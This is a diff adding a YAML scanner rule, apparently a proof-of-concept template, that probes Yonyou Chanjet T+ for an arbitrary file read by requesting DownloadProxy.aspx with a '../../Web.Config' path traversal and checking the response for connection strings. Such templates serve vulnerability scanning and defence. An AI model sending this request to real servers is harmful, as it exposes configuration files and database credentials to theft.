@@ -1,0 +1,11 @@
+name: yonyou-chanjet-tplus-fileread
+rules:
+  - method: GET
+    path: "/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config"
+    expression: |
+      response.status == 200 && (response.body.bcontains(b"connectionString") || response.body.bcontains(b"system.web") || response.body.bcontains(b"configuration"))
+detail:
+  author: PeiQi
+  links:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book
+  description: "用友 畅捷通T+ DownloadProxy.aspx 任意文件读取漏洞"
